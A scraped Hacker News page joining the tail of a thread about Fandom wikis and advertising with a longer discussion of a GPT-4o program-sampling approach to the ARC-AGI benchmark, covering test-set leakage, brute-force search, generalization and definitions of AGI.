relocated there. * Okay, most of the editors moved there, and apparently the ones that stayed on Fandom have developed a siege mentality and started banning anyone who mentions the new wiki on their Discord. It's very strange. Fandom is worse in every possible way, where's the loyalty coming from? reply languagehacker 20 hours agoprevI worked there when it was Wikia. I'm disappointed that the APIs have been hobbled, that the name became something so honestly lame, and that you can't even view images with mobile ad blocking on. It really is about moats and enshittification, which is sad because the communities put a lot of hard work into their content. reply Aardwolf 20 hours agoprevI liked it a lot back when it was named wikia. It was really awesome for niche communities as well as for the most detailed info imaginable on any game I was playing at the time (a use case gamefaqs used to solve). I also really liked the name wikia, it was like a wiki for anything too detailed for wikipedia. But today, yeah... P.S. I never knew it was founded by the same founder as wikipedia! reply liama 19 hours agoprevAre you actually charging for your expertise? reply wannacboatmovie 20 hours agoprevIs it fair to assume the guy who hates ads also doesn't want to pay for access?

It's basically the w3schools for game info: a takeover by people who actually care and then uplifting it to something that's actually good (like what happened with w3schools) is a far better road to victory than getting people to stop using fandom - there are too many people, and too few search engines. reply dark-star 19 hours agoprev> browse a fandom wiki without an ad blocker you lost me here...

What compelled you to comment about the compulsion? Geez. reply TZubiri 15 hours agorootparentIt's a simple concept. You pay for services. Some services are free and funded by ads. Be thankful for the free shit instead of being salty about having to \"pay\" with ads. reply dchftcs 15 hours agorootparentI think people have a unique edge here to counter your argument because most of the work that goes into fandom wikis are from unpaid volunteers, and they have every right to move somewhere esle. reply ergonaught 6 hours agorootparentprev\"Paying\" with ads and having the experience utterly ruined, highjacked in fact, by those ads, are distinct things. You already understand this unless you're an adtech executive, but you're picking nits because you don't want to engage with the point. reply watwut 12 hours agorootparentprevIt is simple concept - just because part of your business plan is to give out some stuff for free and then lock the users, it does not make you uncriticizable. There is no reason to be thankful to Fandom in particular. reply JustLeafy 12 hours agorootparentprevThe problem here isn't necessarily being a free service and being run on a few ads, the problem is loading 15 to 20 advertisements, as well as the path of enshittification. reply lizardking 5 hours agoparentprev [–] One good reason is if they are in the process of enshittifying websites you have been using for decades, like Gamespot, Metacritic, and Giantbomb. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",

Ryan's work is legitimately interesting and novel \"LLM reasoning\" research! The core idea: > get GPT-4o to generate around 8,000 python programs which attempt to implement the transformation, select a program which is right on all the examples (usually there are 3 examples), and then submit the output this function produces when applied to the additional test input(s) Roughly, he's implemented an outer loop and using 4o to sample reasoning traces/programs from training data and test. Hybrid DL + program synthesis approaches are solutions we'd love to see more of. A couple important notes: 1. this result is on the public eval set vs private set (ARC Prize $). 2. the current private set SOTA ~35% solution also performed ~50% on the public set. so this new result might be SOTA but hasn't been validated or scrutinized yet. All said, I do expect verified public set results to flow down to the private set over time. We'll be publishing all the SOTA scores and open source reproductions here once available: https://arcprize.org/leaderboard EDIT: also, congrats and kudos to Ryan for achieving this and putting the effort in to document and share his approach. we hope to inspire more frontier AI research sharing like this reply refreshingdrink 14 hours agoparentAlso worth nothing that Ryan mentions > In addition to iterating on the training set, I also did a small amount of iteration on a 100 problem subset of the public test set and > it's unfortunate that these sets aren’t IID: it makes iteration harder and more confusing It’s not unfortunate: generalizing beyond the training distribution is a crucial part of intelligence that ARC is trying to measure! Among other reasons, developing with test-set data is a bad practice in ML because it hides the difficulty this challenge. Even worse, writing about a bunch of tricks that help results on this subset is extending the test-set leakage the blog post's readers. This is why I'm glad the ARC Prize has a truly hidden test set reply rfoo 9 hours agorootparent... and we know that if we really want to nail it we'd better just pay someone else to create 1,000,000 more harder problems for training (without looking at any in test set, of course). i.e. make the training set distribution similar to test set again. Because the thing we have now is data-hungry. Your brain is pre-trained on other similar challenges as well. What's the point of requiring it to \"generalize beyond the training distribution\" with so few samples? Really, I thought LLMs ended this \"can we pretrain on in-house prepared private data for ILSVRC\" flame war already. reply YeGoblynQueenne 9 hours agorootparentThe problem with that it is we know approaches that can generalise very well from very few examples, even one example, without any kind of pretraining, That requires a good background theory of the target domain (a \"world model\" in more modern parlance), and we don't know how to automatically generate that kind of theory; only human minds can do it, for now. But given such a theory the number of examples needed can be as few as 1. Clearly, if you can learn from one example, but find yourself using thousands, you've taken a wrong turn somewhere. The concern with the data-hungry approach to machine learning, that at least some of us have, is that it has given up on the effort to figure out how to learn good background theories and turned instead to getting the best performance possible in the dumbest possible way, relying on the largest available amount of examples and compute. That's a trend against everything else in computer science (and even animal intelligence) where the effort is to make everything smaller, cheaper, faster, smarter: it's putting all the eggs in the basket of making it big, slow and dumb, and hoping that this will somehow solve... intelligence. A very obvious contradiction. Suppose we lived in a world that didn't have a theory of computational complexity and didn't know that some programs are more expensive to run than others. Would it be the case in that world, that computer scientists competed in solving ever larger instances of the Traveling Salesperson Problem, using ever larger computers, without even trying to find good heuristics exploiting the structure of the problem and simply trying to out-brute-force each other? That world would look a lot like where we are now with statistical machine learning: a pell-mell approach to throwing all resources at a problem that we just don't know how to solve, and don't even know if we can solve. reply yccs27 7 hours agorootparentSadly, right now the \"throw lots of compute at it in the dumbest possible way\" models work, and the \"learn good background theories\" approaches have gone nowhere. It's Rich Sutton's Bitter Lesson and a lot of us aren't ready to accept it. http://www.incompleteideas.net/IncIdeas/BitterLesson.html reply lesuorac 2 hours agorootparent> that ``brute force\" search may have won this time, but it was not a general strategy, and anyway it was not how people played chess. These researchers wanted methods based on human input to win and were disappointed when they did not. Mostly tangential to the article but I never really like this argument. Like you're playing a game a specific way and somebody else comes in with a new approach and mops the floor with you and you're going to tell me \"they played wrong\"? Like no, you were playing wrong the whole time. reply advael 8 hours agorootparentprevThe formalism that data-driven machine learning leans on is empirical tuning of stochastic search to drive approximation of functions, and despite what Silicon Valley would have you believe, most of the significant advances have been in creating useful meta-structures for modeling certain kinds of problems (e.g. convolution for efficiently processing transformations that care about local structure across dimensions of data, or qkv attention for keeping throughlines of non-local correspondences intact through a long sequence). Neural networks as a flavor of empirical function approximation happened to scale well, and then a bunch of people who saw how much this scale improved the models' capabilities but couldn't be bothered to understand the structural component concluded that scale somehow magically gets you to every unsolved problem being solved. It's also convenient for business types that if you buy this premise, any unicorn they want to promise is just a matter of throwing obscene amounts of resources at the problem (through their company of course) I think probably the general idea of dynamic structures that are versatile in their ability to approximate functional models is at least a solid hypothesis for how some biological intelligence works at some level (I think maybe the \"fluid/crystallized\" intelligence distinction some psychology uses is informative here - a strong world model probably informs a lot of quick acquisition of relationships, but most intelligent systems clearly posess strong feedback mechanisms for capturing new models), though I definitely agree that a focus on how best to throw a ton of scale at these models doesn't seem like a fruitful path for actionably learning how to build or analyze intelligent systems in the way we usually think about, nor is it, well, sustainable. Moore's law appeals to business people because buying more computronium feels more like a predictable input-output relationship to put capital into, but even if we're just talking about raw computation speed advances in algorithms tend to dwarf advances in computing power in the long run. I think the same will hold true in AGI reply YeGoblynQueenne 1 hour agorootparentYeah, very good points. To be fair there are people who have argued the big data side who have clearly solid knowledge of AI and are not just SV suits, for example I remember Yann LeCun in a debate with Christopher Manning, where Manning was arguing for the importance of \"structure\" and LeCun was arguing against it. Or see the \"Bitter Lesson\", mentioned in a parent comment. That may have become a total shibboleth of the Silicon bros but Rich Sutton, who wrote the eponymous article, is the guy who wrote the book on Reinforcement Learning (literally). And then Rodney Brooks' replied with his \"Better Lesson\" (https://rodneybrooks.com/a-better-lesson/). So there's a lot of debate in this and I don't reckon we'll have a consensus soon. It should be clear which side I'm on- I work with firmly model-based AI (\"planning is the model-based approach to autonomous behaviour\" has become my shibboleth - see Bonnet and Geffner's book on planning: https://link.springer.com/book/10.1007/978-3-031-01564-9) so maybe it's a deformation professionelle. And even LCun's recent plans for JEPA are very consciously model-based, except he wants to learn his models from data; which is not a bad idea I suppose. reply advael 35 minutes agorootparentI've commented here before that I find myself really conflicted on LeCunn's public statements. I think it's really hard to reconcile the fact that he's undeniably a world-leading expert with the fact that he does work for and represent a tech company in a big way, which means that it's both hard to tell when what he says, especially publicly, is filtered through that lens, either explicitly or just via cultural osmosis. I know some people still in academia (e.g. \"Bitter Lesson\") are following suit but given how much of this field has been scooped up by large tech firms, this necessarily means that what we get out of research from those firms is partially filtered through them. Like it sounds like you're in CS/AI academia so I'm sure you're familiar with the distorting effect this brain drain has had on the field. Research out of places like FAIR or deepmind or OpenAI (arguably they were different until about 2019 or so? Hard to say how much of that was ever true unfortunately) are being done and published by world-leading experts hired by these companies and obviously this research has continued to be crucial to the field, but the fact that it's in industry means there's obviously controls on what they can publish, and the culture of an institution like Facebook is definitely going to have some different effects on priorities than that of most universities, and so while we can all collectively try to take it all with a grain of salt in some way, there is no way to be careful enough to avoid tribal knowledge in the field being heavily influenced by the cultures and priorities of these organizations. But even if this kind of thinking is totally organic, I think it could arise from the delayed nature of the results of data-driven methods. Often a major structural breakthrough for a data-driven approach drastically predates the most obviously impactful results from that breakthrough, because the result impressive enough to draw people's attention comes from throwing lots of data and compute at the breakthrough. The people who got the impressive result might not even be the same team as the one that invented the structure they're relying on, and it's really easy to get the impression that what changed the game was the scale alone, I imagine even if you're on one of those research teams. I've been really impressed by some of the lines of research that show that you can often distill some of these results to not rely so heavily on massive datasets and enormous parallel training runs, and think we should properly view results that come from these to be demonstrations of the power of the underlying structural insights rather than new results. But I think this clashes with the organizational priorities of large tech firms, which often view scale as a moat, and thus are motivated to emphasize the need for it reply advael 8 hours agorootparentprevYou seem to misunderstand why generalization is important for making claims about intelligent systems. To illustrate this, we could really easily design a system that encodes all the test set questions and their answers, puts them in an enormous hash table, and looks up the correct answer to each challenge when presented with it. This could probably score 100% on ARC if given the entire test set. Would you call this AGI? What if I put it through a transformer as a hashing function? The mainstream attention LLMs have garnered has added a bunch of noise to the way we talk about machine learning systems, and unfortunately the companies releasing them are partially to blame for this. That doesn't mean we should change the definition of success for various benchmarks to better suit lay misunderstandings of how this all works reply rfoo 6 hours agorootparentFirst, LLMs are not AGI. Never will be. Can we talk now? > if given the entire test set. I don't want the entire test set. Or any single one in the test set. The problem here is ARC challenge deliberately give a training set with different distribution than both the public and the private test set. It's like having only 1+1=2, 3+5=8, 9+9=18 in training set and then 1+9=10, 5*5=25, 16/2=8, (0!+0!+0!+0!)!=24 in test set. I can see the argument of \"giving the easy problems as demonstration of rules and then with 'intelligence' [1] you should be able to get harder ones (i.e. a different distribution)\", but I don't believe it's a good way to benchmark current methods, mainly because there are shortcuts. Like I can teach my kids how factorial works and ! means factorial, instead of teaching them how addition works only and make them figure out how multiplication, division and factorial works and what's the notation. [1] Whatever that means. reply astromaniak 31 minutes agorootparent> First, LLMs are not AGI. It's the most generic thing we have right now, right? > Never will be. If there is no other breakthrough anytime soon we can engineer AGI-like things around LLMs. I mean LLM trained to use different attachments. Which can be other models and algorithms. Examples will be image recognition models and databases for algorithms. Even now ChatGPT can use Bing search and Python interpreter. First steps done, others will follow. The result will be not a true AGI, but still a very capable system. And there is another factor. Next models can be trained on high quality data generated by current models. Instead of internet random garbage. This should improve their spacial and logical abilities. reply advael 2 hours agorootparentprevOkay I admit I'm confused and think I probably missed a crucial thing here. You're saying the publicly available problem set isn't indicative of the distribution of the test set? If so, I can see why you object to that. Still, it's potentially possible that the test's intention is to demonstrate something like progressive integration of compositionality given an abstract model. A lot of machine learning systems can do well as long as they've seen an example similar to the problem they've been presented, but can't do things like respond to a situation that presents them with a novel composition of two abstractions they seem to have already learned in the way a human can trivially. Like only having [1+1=2, 4+5=9, 2+10=12] in the training set and [2*5=10, 3/4=.75, 2^8=256] in the test set would be bad, but something like [1+1=2, 3+4*2=11, 5*3=15, 2*7=14, 1+3/5=1.8, 3^3=27] vs [2+4*3=14, 3+3^2+4=16, 2*3/4+2^3/2^4=2] might not be, depending on what they're trying to test Compositionality of information, especially of abstractions (like rules or models of a phenomenon), is a key criterion in a lot of people's attempts to operationally define \"intelligence\" (which I agree is overall a nebulous and overloaded concept, but if we're going to make claims about it we need at least a working definition for any particular test we're doing) I could see that meaning that the test set problems need to be \"harder\" in the sense that presenting compositions of rules in training doesn't preclude memorizing the combinations. But this is just a guess, I'm not involved in ARC and don't know, obviously* reply rfoo 11 minutes agorootparent> You're saying the publicly available problem set isn't indicative of the distribution of the test set? Yes. From https://arcprize.org/guide: Please note that the public training set consists of simpler tasks whereas the public evaluation set is roughly the same level of difficulty as the private test set. The public training set is significantly easier than the others (public evaluation and private evaluation set) since it contains many \"curriculum\" type tasks intended to demonstrate Core Knowledge systems. It's like a tutorial level. reply blobbers 50 minutes agorootparentprevThe problem is there is no way to infer the right answer to 0! given the training. You need more context to learn it. Humans need more context. If you put that at the end of every grade 1 math test no student would get it right unless they had some context. Do grade 1 kids have AGI? (Haha) But seriously, all professions need to train in context to solve complex problems. You can train in adjacent realms and reason about problems but to truly perform, you need more training. A general surgeon might be better than an electrician as a vet, but that I’d rather have a veterinary surgeon operate on my dog. So some things are “AGI” able and other things need specific training. reply advael 5 minutes agorootparentI think there's variance in people's degree of compositionality, as well as how quickly they can pick up on novel relationships. Testing \"intelligence\" in humans has always been kind of fraught in the first place, but any capability we may care to measure is going to permit degrees, and there will be some variance in humans on it. We should expect this. There's variance in goddam everything We should also expect machine learning systems to have somewhat different properties from human minds. Like computers are more likely to accomplish perfect recall, and we can scale the size of their memory and their processing speed. All these confounding variables can make it hard to make binary tests of a capability, which is really what ARC seems like it's trying to do. One such capability that AI researchers will often talk about is conceptual compositionality. People care about compositionality because it's a good way to demonstrate that an abstract model is being used to reason about a situation, which can be used in unseen but perhaps conceptually similar situations. This \"generalization\" or \"abstraction\" capability is really the goal, but it's hard to reason about how to test it, and \"composition\" (That is, taking a situation that's novel, but a straightforward application of two or more different abstractions the agent should already \"know\") is one more testable way to try to tease it out. As you point out, humans often fail this kind of test, and we can rightly claim that in those cases, they didn't correctly grasp the insight we were hoping they had. Testing distilled abstractions versus memorization or superficial pattern recognition isn't just an important to AI research, it's also a key problem in lots of places in human education refibrillator 18 hours agoparentprevDo you have any perspectives to share on Ryan's observation of a potential scaling law for these tasks and his comment that \"ARC-AGI will be one benchmark among many that just gets solved by scale\"? reply mikeknoop 13 hours agorootparentARC isn't perfect and I hope ARC is not the last AGI benchmark. I've spoken with a few other benchmark creators looking to emulate ARC's novelty in other domains, so I think we'll see more. The evolution of AGI benchmarks likely needs to evolve alongside the tech -- humans have to design these tasks today to ensure novelty but should expect that to shift.

I mean, generating tens of thousands of possible solutions, to find one that works does not, to me, signify AGI. After all, the human solving these problem doesn't make 10k attempts before getting a solution, do they? The approach here, due to brute force, can't really scale: if a random solution to a very simple problem has a 1/10k chance of being right, you can't scale this up to non-trivial problems without exponentially increasing the computational power used. Hence, I feel this is brute-force. reply killerstorm 7 hours agorootparent10000 samples are nothing compared to 2^100 possible outputs. It is absolutely, definitely not a \"brute search\".

The idea is to generate all possible solutions to the problem using brute force ...\" And a bit further down chapter 5: \"We can often optimize backtracking by pruning the search tree. The idea is to add ”intelligence” to the algorithm so that it will notice as soon as possible if a partial solution cannot be extended to a complete solution. Such optimizations can have a tremendous effect on the efficiency of the search.\" Your mistake is that you for some reason believe that any search over solution space is a brute force solution. But there are many ways to search over a solution space. A \"dumb search\" over solution space is generally considered to be brute force, whereas a \"smart search\" is generally not considered to be brute force. Here's the Codeforces profile of the author: https://codeforces.com/profile/pllk edit 2: Ok now I think I understand what causes your confusion. When an author writes \"One way to speed up a brute-force algorithm ...\" you think that the algorithm can still be called \"brute force\" after whatever optimizations were applied.

I mean, in a way that allows comparing different approaches and being a reasonable metric of progress. reply YeGoblynQueenne 1 hour agorootparentI don't. I'm guessing -and it's nothing but a guess- that for every problem that can be solved with intelligence there exists a solution that does not require intelligence. I'm guessing in other words that intelligence is the ability to come up with solutions to arbitrary problems. If that's true then there's no way to test for intelligence by looking at the performance of a system at any particular task, or any finite set of tasks, and so there's no way to create a \"test for intelligence\". My guess is supported by the experience that, in AI research, every time someone came up with a plausible test for intelligence, an AI system eventually passed the test only to make it clear that the test was not really testing intelligence after all (edit: I don't just mean formal tests; e.g. see how chess used to \"require intelligence\" right up until Deep Blue vs Kasparov). Some people see that as \"moving the goalposts\" and it's certainly frustrating but the point is that we don't know what intelligence is, exactly, so it's very hard to test for its existence or not, or to measure it. My preference would be for everyone in AI research to either stop what they're doing and try to understand what the hell intelligence is in the first place, to create a theory of intelligence so that AI can be a scientific subject again, or to at least admit they're not interested in creating artificial intelligence. I, for example, am not, but all my background is in subjects that are traditionally labelled \"AI\" so I have to suck it up, I guess. reply Nimitz14 18 hours agoparentprevAh that's an important detail about public v private.

If he only sampled 20 programs, instead of 8000, will we still say the programs came from \"training data\", or will we say it's genuine OOD generalization? At what point do we attribute the intelligence to the LLM itself instead of the outer loop? This isn't meant to be facetious. Because clearly, if the N programs sampled is very large, it's easy to get the right solution with little intelligence by relying on luck. But as N gets small the LLM has to be intelligent and capable of OOD generalization, assuming the benchmark is good. reply whiplash451 11 hours agoprevThe article jumps to the conclusion that \"Given that current LLMs can perform decently well on ARC-AGI\" after having used multiple hand-crafted tricks to get to these results, including \"I also did a small amount of iteration on a 100 problem subset of the public test set\" which is hidden in the middle of the article and not mentioned in the bullet list at the top.

So at what point does a human go from not generally intelligent to generally intelligent? And I don't mean an age or brain size, I mean suite of testable abilities. Intelligence is an ability that is naturally gradual and emerges over many domains. It is a collection of tools via which general abstractive principles can be applied, not a singular universally applicable ability to think in abstractions.

Developmental psychology would be a good place to start looking for answers to this question. Also, forgetting scientific approach and going with common sense, we do not allow young humans to operate complex machinery, decide who is allowed to become a doctor, or go to jail. Intelligence is something that is not equally distributed across the human population and some of us never have much of it, yet we function and have a role in society. Our behaviour, choices, preferences, opinions are not just based on our intelligence, but often on our past experiences and circumstances. It is also not the sole quality we use to compare ourselves against each other. A not very intelligent person is capable of making the right choices (an otherwise obedient soldier refusing to press the button and blow up a building full of children); similarly, a highly intelligent person can become a hard-to-find serial criminal (a gynecologist impregnating his patients).

For instance, I doubt any human alive, let alone average humans can give reasonable explanations for short snippets of computer code in as many languages as GPT-4o, or formulate poetry in as many styles on arbitrary topics, or rattle off esoteric trivia and opinions about obscure historic topics, .... I think you get the point. It has already surpassed average human abilities in many categories of intellectually challenging tasks, but with your definition if it fails at even one task an average human can do, then it lacks \"general intelligence.\" I suggest that your definition is one for \"AHI\" (Average Human Intelligence), not one for \"AGI\" (Artificial General Intelligence.) reply blharr 14 hours agoparentprevThe \"general\" part of AGI implies it should be capable across all types of different tasks. I would definitely call it real Artificial Intelligence, but it's not general by any means. reply FeepingCreature 12 hours agorootparentIt's capable of attempting all types of different tasks. That is a novel capability on its own. We're used to GPT's amusing failures at this point, so we forget that there is absolutely no input you could hand to a chess program that would get it to try and play checkers. Not so with GPT. It will try, and fail, but that it tries at all was unimaginable five years ago. reply dahart 11 hours agorootparentIts amusing to me how the very language used to describe GPT anthropomorphizes it. GPT wont “attempt” or “try” anything on its own without a human telling it what to try, it has no agenda, no will, no agency, no self-reflection, no initiative, no fear, and no desire. It’s all A and no I. reply FeepingCreature 9 hours agorootparentDo you agree that \"there is absolutely no input you could hand to a chess program that would get it to try and play checkers\", but there is an input you can hand to GPT-3+ that will get it to try and play pretty much any game imaginable, so long as you agree that its attempt will be very poor? I don't want to get into the weeds on what intelligence is or what \"attempt\" means or \"try\" means (you can probably guess I disagree with your position), but do you have a disagreement on pure input/output behavior? Do you disagree that if I put adequate words in, words will come out that will resemble an attempt to do the task, for nearly any task that exists? reply dahart 20 minutes agorootparentYou’re trying to avoid addressing my point. What can GPT do that’s interesting without a human in the loop doing the prompting? Lol “very poor”. You’re attempting to argue that if there’s any output at all in response to an input prompt, then GPT is “trying” and showing signs of intelligence, no matter what the output is. By this logic, you contradicted yourself: the chess engine can play checkers, poorly. By this logic, asking the sky to play a game means the sky is trying because it changes, or asking a random number generator to play a game means it resembles an attempt to play because there is “very poor” output. There are lots of games GPT can’t play, like hide-and-seek, tag, and tennis. Playing a game means playing by the rules of the game, giving coherent output, and trying to win. GPT can’t play games it hasn’t seen before, and no I don’t agree that “very poor” output counts. It doesn’t (currently) learn the rules from your prompts; the “very poor” output from a game it wasn’t trained on will never improve. And, to my point, GPT will not play any games at all unless you ask it to. reply lupusreal 2 hours agorootparentprevThat's not an interesting argument, all you're doing is staking out words that are reserved for beings with souls or something. It's like saying submarines can't swim. It's an argument about linguistics, not capabilities. reply dahart 40 minutes agorootparentDisagree. The ability to “try” is a capability, and GPT doesn’t have it. Everything in the world that we’ve called “intelligent” up to this point has had autonomy and self motivation, and GPT doesn’t have those things. GPT doesn’t grow and doesn’t learn from its mistakes. GPT won’t act without a prompt, this is a basic fact of its design, and I’m not sure why people are suddenly confused about this. reply dr_dshiv 10 hours agoparentprevTotally agree.

When GPT-4 first came out I tried some very naive approaches using JSON representations on the puzzles [0], [1]. GPT-4 did \"okay\", but in some cases it felt like it was falling for the classic LLM issue of saying all the right things but then then failing to grasp some critical bit of logic and missing the solution entirely. At the time I noticed that many of the ARC problems rely on visual-spatial priors that are \"obvious\" when viewing the grids, but become less so when transmuted to some other representation. Many of them rely on some kind of symmetry, counting, or the very human bias to assume a velocity or continued movement when seeing particular patterns. I had always thought maybe multimodality was key: the model needs to have similar priors around grounded physical spaces and movement to be able to do well. I'm not sure the OP really fleshes this line of thinking out, brute forcing python solutions is a very \"non human\" approach.

I remember reading a number of relatively well-informed suggestions that there are a number of a models inside there, and the API being interacted with is some form of outer-loop around them. I don't think the location of the outer-loop or the design of it really makes much difference. There is no flock of birds without the individuals, the flock itself doesn't really exist as a tangible thing, but what arises out of the collective adjustments between all these individuals gives rise to a flock. Similarly, we may find groups of LLMs and various outer control loops give rise to an emergent phenomena much greater than the sum of their parts. reply YeGoblynQueenne 5 hours agorootparent>> We don't really know what GPT-4 \"is\".

ARC-AGI has odd features that leave me flummoxed by the naming and the attendant prize money and hype. It is one singular task and frankly I strongly suspect someone could beat it within 30 days[1], in an unsatisfying way, as you note. There's so much alpha that can be pieced together from here, ex. the last couple Google papers use the 1M context to do *500-shot*, i.e. 500 question answer examples. IIRC most recent showed raising travelling-salesman problem solve rate from 3 to 35%. [1] I pre-registered this via a Twitter post, about 48 hours ago, i.e. before this result was announced. reply nl 14 hours agorootparentI don't think this is \"non-satisfying\" at all. Program synthesis has been mentioned as a promising approach by François Chollet, and that's exactly what this is. The place I find slightly unsatisfying is this: > Sample vast, vast numbers of completions (~5,000 per problem) from GPT-4o. > Take the most promising 12 completions for each problem, and then try to fix each by showing GPT-4o what this program actually outputs on the examples, and then asking GPT-4o to revise the code to make it correct. We sample ~3,000 completions that attempt to fix per problem in total across these 12 starting implementations. I'd been tossing around a MCTS idea similar to AlphaGo, based on the idea that the end transformation is a series of sub-transformations. I feel like this could work well alongside the GPT-4o completion catalog. (This isn't an original observation or anything) reply YeGoblynQueenne 7 hours agorootparent>> Program synthesis has been mentioned as a promising approach by François Chollet, and that's exactly what this is. To be precise, \"this\" -a bog-standard generate-and-test approach- is the dumbest possible way to do program synthesis. It's like sorting lists with bogosort and a very big computer. It's exactly like bogosort: generate permutations and test. Except of course the system that generates permutations costs a few millions(?). reply bubblyworld 7 hours agorootparentBogosort is driven by 0 heuristics - just shuffle and play. Using an LLM as a high-level prior over your search is very different, and the author had to do a lot of problem-specific tuning to make it work well. reply YeGoblynQueenne 1 hour agorootparentBut he tuned the \"test\" side of the generate-and-test loop, not the \"generate\" side. The \"generate\" side remains a big permutation generator that is also very hard to control. The current highest-ranked system on the private test set of the ARC-AGI (at 34%) is another LLM fine-tuned on manually created examples of ARC tasks, so that would indeed be messing with the generator part of the loop. I'm guessing performance will jump when someone puts the two together. A heuristic btw, is something completely different than fine tuning, or filtering. Heuristic search is the closest thing we have to an approximation of the kind of goal-driven behaviour we see in animal intelligence. I think you could argue that gradient optimisation or any kind of optimisation of some kind of objective function is the same (Rich Sutton has a paper titled \"Reward is all you need\"). I'm not sure where I stand with that. reply bubblyworld 12 hours agorootparentprevClassic, I've been doing the same, writing an alphazero for the transformation part.

The author points this out as it's more of a pattern matching test. Though on the other hand figuring out which manipulations are effective does teach us something. And I think most problems boil down to pattern matching, creating a true, easily testable AGI test may be tough. reply worstspotgain 17 hours agoparentLet me play devil's advocate for a second. Let's suppose that with LLMs, we've actually invented an AGI machine that also happens to produce useful textual responses to a prompt. This would sound more far-fetched if we knew exactly how they work, bit-by-bit. We've been training them statistically, via the data-for-code tradeoff. The question is not yet satisfactorily answered. In this hypothetical, for every accusation that an LLM passes a test because it's been coached to do so, there's a counter that it was designed for \"excessively human\" AGI to begin with, maybe even that it was designed for the unconscious purpose of having humans pass it preferentially. The attorney for the hypothetical AGI in the LLM would argue that there are tons of \"LLM AGI\" problems it can solve that a human would struggle with. Fundamentally, the tests are only useful insofar as they let us improve AI. The evaluation of novel approaches to pass them like this one should err in the approaches' favor, IMO.

We're talking about having the LLM generate thousands of candidate solutions, and they're mostly bad enough that \"just pick the ones that get kinda close on the examples\" is a meaningful operation. 2) More samples improves performance despite the fact that GPT-4o's vision is not capable of parsing the inputs. I'm curious how much performance would degrade if you shuffled the images passed to the model (but used the correct images when evaluating which candidates to keep). 3) It's definitely true that the LLM has to be giving you something more than random programs. At the very least, the LLM knows how to craft parsimonious programs that are more likely to be the solution. It may be that it's providing more than that, but it's not clear to me exactly how much information on the correct search space is coming from the hand-crafted examples in the prompt. Overall, the work to get this far is very impressive, but it doesn't really move the needle for me on whether GPT-4 can do ARC puzzles. It does, however, show me that search is surprisingly powerful on this task. reply bearjaws 16 hours agoprevSeems that Arc-AGI is more flawed rather than GPT-4o is more AGI.

Most of my doubts about this claim are concerns that you can basically brute force ARC-AGI without interestingly doing learning (e.g. brute-force search over some sort of DSL or training on a huge array of very similar problems). These concerns apply much less to the kind of approach I used The approach described in the article is exactly \"brute-force search over some sort of DSL\". The \"DSL\" is a model of Python syntax that GPT-4o has learned after training on the entire internet. This \"DSL\" is locked up in the black box of GPT-4o's weights, but just because no-one can see it, it doesn't mean it's not there; and we can see GPT-4o generating Python programs, so we know it is there, even if we don't know what it looks like. That DSL may not be \"domain specific\" in the sense of being specifically tailored to solve ARC-AGI tasks, or any other particular task, but it is \"domain specific\" in the sense of generating Python programs for some subset of all possible Python programs that includes programs that can solve some ARC-AGI tasks.

The problem is, the optimism really seems to be justified, and the rate of improvement of LLMs in the past 12 months has been nothing short of astonishing. So it's not at all surprising to me to see Arc already being mostly solved using existing models, just with different prompting techniques and some tool usage. At some point, the naysayers about LLMs are going to have to confront the problem that, if they are right about LLMs not really thinking/understanding/being sentient, then a very large percentage of people living today are also not thinking/understanding/sentient! reply HarHarVeryFunny 19 hours agoparentActually the solution being discussed here is the one that Chollet mentioned in his interview with Dwarkesh, and only bolsters his case.

The actual reasoning is done by an agentic like loop wrapped around the LLM, as described in the linked blog. reply awwaiid 17 hours agorootparentWhen you peer into the soul of the machine it delicately resolves to `while(1){...}`. All Hail The REPL. reply traject_ 19 hours agoparentprev> It's almost as if he's being overly negative about them to make a point or something to push back against all the unbridled optimism. I don't think it is like that but rather Chollet wants to see stronger neuroplasticity in these models. I think there is a divide between the effectiveness of existing AI models versus their ability to be autonomous, robust and consistently learn from unanticipated problems. My guess is Chollet wants to see something more similar to biological organisms especially mammals or birds in their level of autonomous nature. I think people underestimate the degree of novel problems birds and mammals alone face in just simply navigating their environment and it is the comparison here that LLMs, for now at least, seem lacking. So when he says LLMs are not sentient, he's asking to consider the novel problems animals let alone humans have to face in navigating their environment. This is especially apparent in young children but declines as we age and gain experience/lose a sense of novelty. reply infgeoax 16 hours agorootparentAgree. When I first saw ARC, my reaction was this could possibly be the kind of problem that gives us evolutionary pressure. reply TacticalCoder 19 hours agoparentprev> I don't find any of Chollet's critiques of LLMs to be convincing. It's almost as if he's being overly negative about them to make a point or something to push back against all the unbridled optimism. Chollet published his paper On the measure of intelligence in 2019. In Internet time that is a lifetime before the LLM hype started. reply gwern 18 hours agorootparentFrom Chollet's perspective, the LLM hype started well before, with at least GPT-2 half a year before his paper, and he spent plenty of time mocking GPT-2 on Twitter before he came up with ARC as a rebuttal. reply modeless 15 hours agorootparentIt's a very convincing rebuttal considering that GPT-3 and GPT-4 came out after ARC but made no significant progress on it. He seemingly had the single most accurate and verifiable prediction of anyone in the world (in 2019) about exactly what type of tasks scaled LLMs would be bad at. reply refulgentis 18 hours agorootparentprevEinstein, infamously, couldn't really make much progress with quantum physics, even though he invented the precursors (ex. Brownian motion). Your world model is hard to update. reply imperfect_light 16 hours agorootparentA bit of a stretch given that Chollet is a researcher in deep learning and transformers and his criticism is that memorization (training LLMs on lots and lots of problems) doesn't equate to AGI. reply refulgentis 15 hours agorootparent> A bit of a stretch Is that true?

I don't mean to offend, but to be really straightforward: he's the one saying it's possible they might be AGI now. I'm as flummoxed as you, but I think its hiding the ball to file it under \"he doesn't mean what he's saying, because he doesn't believe LLMs can ever be AGI.\" The only steelman for that is playing at: AGI-my-benchmark, which I say is for AGI, is not the AGI I mean reply imperfect_light 13 hours agorootparentYou're reading a whole lot into a tweet, in his interview with Dwarkesh Patel he says, about 20 different times, that scaling LLMs (as they are currently conceived) won't lead to AGI. reply anoncareer0212 11 hours agorootparentYou keep changing topics so I don't get it either, I can attest it's not a fringe view that the situation is interesting, seen it discussed several times today by unrelated people. reply imperfect_light 39 minutes agorootparentHe's said it pretty clearly, an LLM could be part of the solution in combination with program synthesis, but an LLM alone won't achieve AGI. reply infgeoax 16 hours agorootparentprevBut it's his EPR paper inspired the Bell's inequality and pushed the field further.

